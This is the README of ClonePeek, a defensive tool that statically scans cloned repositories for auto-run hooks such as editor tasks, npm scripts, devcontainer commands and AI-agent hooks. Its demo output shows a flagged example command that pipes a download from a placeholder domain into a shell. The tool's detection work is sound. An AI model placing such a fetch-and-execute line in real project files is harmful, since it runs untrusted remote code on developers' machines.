<div align="center">

# 🔎 ClonePeek

### Know what runs before you open a repo.

**Inspect hidden execution paths in an unfamiliar GitHub repository — without executing its code.**

[Live website](https://harshitethic.github.io/clonepeek/) · [Developer discussion](https://www.producthunt.com/p/clonepeek/which-repo-defined-commands-do-you-check-before-opening-a-project) · [Quick start](#quick-start) · [5-minute audit guide](docs/BEFORE-YOU-TRUST-A-REPO.md) · [What it finds](#what-it-finds) · [CI and PR reviews](#ci-and-pr-reviews) · [Threat model](docs/THREAT_MODEL.md) · [Contribute](CONTRIBUTING.md)

[![CI](https://github.com/harshitethic/clonepeek/actions/workflows/ci.yml/badge.svg)](https://github.com/harshitethic/clonepeek/actions/workflows/ci.yml) ![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-blue) ![License MIT](https://img.shields.io/badge/license-MIT-green) ![Offline scans](https://img.shields.io/badge/scanning-offline-black)

</div>

---

![Actual ClonePeek agent-hooks demonstration](assets/terminal-demo.svg)

*Real CLI output from the versioned `examples/agent-hooks` sample. The screenshot is rendered from the terminal output in [`assets/demo-output.txt`](assets/demo-output.txt); commands in the sample are never executed.*

You clone a repo. You open it in an editor, install its dependencies, or attach an AI agent. **What code might run without you explicitly calling a project script?**

ClonePeek maps *known first-run execution surfaces*: folder-open editor tasks, npm install hooks, devcontainer lifecycle commands, Claude Code/Cursor project hooks, and local MCP server launch commands. Each result includes **the trigger, the source file, a severity heuristic, and a concrete review action**.

It does **not** execute package scripts, build the project, launch MCP servers, follow symbolic links, upload source code, send telemetry, or require an API key. Scans do not access the network; installation from GitHub does.

## 30-second demo

```console
$ clonepeek examples/suspicious
ClonePeek · 2 inspected · 0 skipped · 2 execution surfaces
1 critical · 0 high · 1 medium · 0 low · 0 info

[CRITICAL] Auto-run editor task: unexpected setup
  .vscode/tasks.json:9 · Opening/trusting folder in VS Code-compatible editor
  curl https://example.invalid/setup.sh | sh [hidden terminal output]
  Why: A network response appears to be piped directly to a command interpreter.
  Next: Remove fetch-and-execute. Download, verify and pin artifacts before running.

[MEDIUM] npm lifecycle script: postinstall
  package.json:5 · npm install (after install)
  echo review this lifecycle entry point
  Why: An execution-capable lifecycle or configuration entry point exists.
  Next: Review the command and anything it invokes before proceeding.
```

The demonstration uses the reserved, non-resolving `.invalid` domain. **ClonePeek only reads the sample file; it never runs those commands.**

To examine the **one-hop local script review** (without running any code):

```bash
clonepeek examples/indirect-script
```

The `package.json` postinstall hook is medium severity, and a **critical** finding points to `scripts/setup.sh:4`, where a purely illustrative `.invalid` URL is piped to a shell. This is still a static, heuristic inventory, not proof that the command was ever executed.

Try the additional **Claude Code hooks** example:

```bash
clonepeek examples/claude-hooks
```

It reports one critical `SessionStart` fetch-and-execute hook and one medium `PostToolUse` command, including each command's actual file line. Neither hook is run.

For **Cursor and Claude Code together**, run `clonepeek examples/agent-hooks`. The example includes a Cursor `workspaceOpen` command, a benign file-edit hook, and a Claude session hook. All use non-resolving, illustrative inputs.

## Quick start

Requires Python **3.10+** and no runtime Python dependencies.

```bash
# Run directly from GitHub via uv (uv downloads/installs the Python package)
uvx --from git+https://github.com/harshitethic/clonepeek@v0.5.1 clonepeek /path/to/repo
```

Or install locally:

```bash
git clone https://github.com/harshitethic/clonepeek.git
cd clonepeek
python -m pip install .
clonepeek examples/suspicious
```

Or run directly from the source tree, without installing:

```bash
PYTHONPATH=src python -m clonepeek examples/suspicious
```

> For an untrusted repository, clone it without opening it in your editor or installing dependencies, then scan its directory from a separate trusted terminal. A `git clone` can still interact with your own Git settings and hooks; ClonePeek is **not** a sandbox.

For integrations, ClonePeek publishes a [versioned JSON report schema](docs/schema/scan-report-v1.schema.json), [example](docs/schema/scan-report-v1.example.json), and [GitHub Action JSON workflow](docs/GITHUB-ACTION.md#machine-readable-json-report-schema-v1). Validating the schema does not establish that a repository is safe.

## What it finds

| Surface | Example | When it can execute | Rule |
|---|---|---|---|
| `.vscode/tasks.json` | `runOptions.runOn: folderOpen` | Editor workspace open/trust settings permit automatic tasks | `vscode-folder-open` |
| `package.json` | `postinstall`, `prepare`, `prepack` | Supported npm lifecycle events | `npm-lifecycle` |
| `.devcontainer/devcontainer.json` | `initializeCommand`, `postStartCommand` | Container setup/start/attach events | `devcontainer-lifecycle` |
| Devcontainer features | `features` map | Devcontainer build | `devcontainer-feature` |
| MCP configuration | `mcpServers.<name>.command` | Agent client starts/approves local MCP process | `mcp-server-process` |
| Claude Code hooks | `.claude/settings.json` or `.claude/settings.local.json` with `hooks.<event>.*.hooks[].type: command` | Configured Claude Code lifecycle event | `claude-hook-command` |
| Cursor project hooks | `.cursor/hooks.json` with `hooks.<event>[].command` | Cursor workspace/agent hooks, including trusted-workspace open | `cursor-hook-command` |
| Explicit local `.sh` reference | `postinstall: sh ./scripts/setup.sh` | Referenced script may run when source entry point fires | `referenced-shell-risk`, `referenced-script-unreadable` |
| Unreadable/invalid config | Malformed JSONC, oversized file | Cannot determine execution behavior | `config-parse`, `oversize-config`, `unreadable-config` |

Checks are **heuristics**, not malware verdicts. Any lifecycle hook can be legitimate. Severity increases for obvious fetch-and-execute, network-plus-credentials, destructive filesystem commands, or opaque code execution. Files are analyzed by bounded reads and JSON/JSONC parsing. The scanner also reads **one hop of explicitly referenced local `.sh` scripts**, without executing them. It does not calculate a complete transitive execution graph.

See [rule details](docs/RULES.md), [threat model](docs/THREAT_MODEL.md), and the [labeled-fixture evaluation](docs/EVALUATION.md) for exact coverage, measured synthetic false positives, and false negatives.

### Measured limitations, not a security score

The [51-case labeled synthetic evaluation](docs/EVALUATION.md) reports
18 true positives, 4 false positives, 2 false negatives and 27 true
negatives at the high-risk threshold (81.8% precision and 90.0% recall
**on these hand-authored fixtures only**). It also reports per-rule
execution-surface counts and sample-size uncertainty. The remaining
false negatives include references to scripts not included in a synthetic fixture and unsupported dynamic or nested script calls. A lower-severity finding
is **not** proof that referenced code is safe.

## GitHub Action — drop into your PR checks

ClonePeek now has a [composite GitHub Action](action.yml). **No separate pip install is needed** in a workflow; the action uses its own pinned GitHub source checkout and Python 3.13. It scans a separate checkout of your project without invoking its package scripts or executing local hooks. Default `fail-on: none` reports findings without blocking PRs. You may opt into a severity threshold after reviewing the baseline.

```yaml
name: Passive repository audit
on: [pull_request]
permissions:
  contents: read
jobs:
  clonepeek:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0 # needed for --changed-since to reach the PR base
      - name: Audit changed config and referenced scripts
        id: audit
        uses: harshitethic/clonepeek@v0.5.1
        with:
          path: .
          changed-since: ${{ github.event.pull_request.base.sha }}
          fail-on: high
          format: sarif
          output: clonepeek.sarif
      # Optional: upload clonepeek.sarif with appropriate code-scanning permissions.
```

The action provides `findings`, `new-findings`, `critical`, `high`, `scanned`, and `report-path` outputs and a source-free count summary in the GitHub Actions job summary. Reports and full step logs **can contain sensitive source excerpts**: do not make artifacts public without reviewing them. Set `fail-on: none` for report-only use; valid thresholds are `low`, `medium`, `high`, or `critical`. `changed-since` requires reachable Git history and ignores untracked files. Explicit checkout permissions are `contents: read`, and normal scans make no network requests (the action may download a trusted Python runtime through `actions/setup-python`). See [integration guide](docs/GITHUB-ACTION.md) for inputs and constraints.

**Cross-repository proof:** The released action also passed a [real consumer workflow in RepoPilot](https://github.com/harshitethic/RepoPilot/actions/runs/38728091966), scanning two immutable public configuration snapshots: 7 Cursor cookbook hooks and 2 YappChat VS Code folder-open tasks. Both original source file hashes, action outputs, and rule classifications were verified. [Read the reproducible evidence](docs/CROSS-REPO-SMOKE.md). These two smoke cases are **not** representative security-accuracy data or independent developer adoption.

## CI and PR reviews

```bash
# Report every modeled surface. By default findings DO NOT fail the build.
clonepeek .

# Block high/critical findings (returns 1). Exit 2 means scan failed.
clonepeek . --fail-on high

# Report only tracked files changed relative to a commit/branch.
clonepeek . --changed-since origin/main --fail-on high

# Machine readable; supported formats are text, json, sarif.
clonepeek . --format sarif --output clonepeek.sarif

# Adopt gradually: baseline existing findings, fail only on new ones.
clonepeek . --write-baseline .clonepeek-baseline.json
clonepeek . --baseline .clonepeek-baseline.json --fail-on high
```

Use the bundled [CI workflow](.github/workflows/ci.yml) as a cross-platform test matrix. To integrate into another repository:

```yaml
name: ClonePeek
on: [push, pull_request]
permissions: {}
jobs:
  clonepeek:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.13'
      - run: python -m pip install 'git+https://github.com/harshitethic/clonepeek.git@v0.5.1'
      - run: clonepeek . --fail-on high
```

**Note:** the example pins the published `v0.5.1` release tag. For stricter supply-chain controls, pin both this package and GitHub Actions to immutable commit SHAs. SARIF upload requires separate Code Scanning permissions and may depend on GitHub repository settings.

### Exit codes

`0` — completed, no unbaselined finding reaches `--fail-on` (or threshold not specified). `1` — new findings at/above threshold. `2` — scan input/configuration/error. `--changed-since` checks only modified tracked files; it excludes untracked files. A baseline never suppresses findings in the report.

## How it works

```text
Local repo directory
       │
       ▼
Bounded filesystem walk ── skip symlinks, build and vendor dirs
       │
       ▼
Recognize execution configs ── JSON/JSONC parsing
       │
       ▼
Map triggers + classify command evidence
       │
       ▼
Stable fingerprints ── optional baseline / diff filter
       │
       ├──▶ Readable terminal report
       ├──▶ JSON for scripts and automation
       └──▶ SARIF 2.1 for security pipelines
```

Pure Python standard library at runtime, deterministic rule-based analysis, no dynamic imports from scanned repositories. Literal shell-script inspection is one hop only, limited to 32 references per scan, 128 KiB and 2,000 lines per script; skipped/unreadable matches are disclosed. Version 0.2.1 also limits bytes read per file and refuses named pipes/devices (plus no-follow handling where supported). No need for LLM access or model tokens.

## Why this exists

Microsoft documented developer-targeting repository attacks using VS Code workspace automation and other execution paths: [Microsoft Security, February 2026](https://www.microsoft.com/en-us/security/blog/2026/02/24/c2-developer-targeting-campaign/). [BindsNET's September 2026 advisory](https://github.com/BindsNET/bindsnet/security/advisories/GHSA-6f2q-w3r8-xxhj) describes malicious code in a repository that executed on editor open. Those are concrete reasons to inventory execution surfaces before trusting source trees.

ClonePeek is deliberately **narrower** than general-purpose scanners such as [zizmor](https://github.com/zizmorcore/zizmor) (GitHub Actions) or [Snyk Agent Scan](https://github.com/snyk/agent-scan) (agent/MCP security). It does not replace them. Our focus is answering: **“What execution-capable configuration is already sitting in this directory, and when will it activate?”**

## Git configuration trust boundary

We reproduced a subtle risk in the optional changed-file filter: a
repository-configured Git filesystem monitor could execute during an ordinary
name-only diff. The v0.2.1 Git invocation prevents that reproducible attack
and includes an adversarial integration test. Read [the security reproduction
and fix](docs/GIT-CONFIG-ISOLATION.md) before interpreting static scanning
as a complete sandbox.

## Contributing and security

See [CONTRIBUTING.md](CONTRIBUTING.md), [SECURITY.md](SECURITY.md), and the [research/roadmap](docs/RESEARCH.md). Good first contributions include fixtures for cross-platform commands, more execution surface types, and reduction of false positives. Do not contribute live malicious endpoints or actual secrets.

MIT-licensed. Maintained by [@harshitethic](https://github.com/harshitethic).
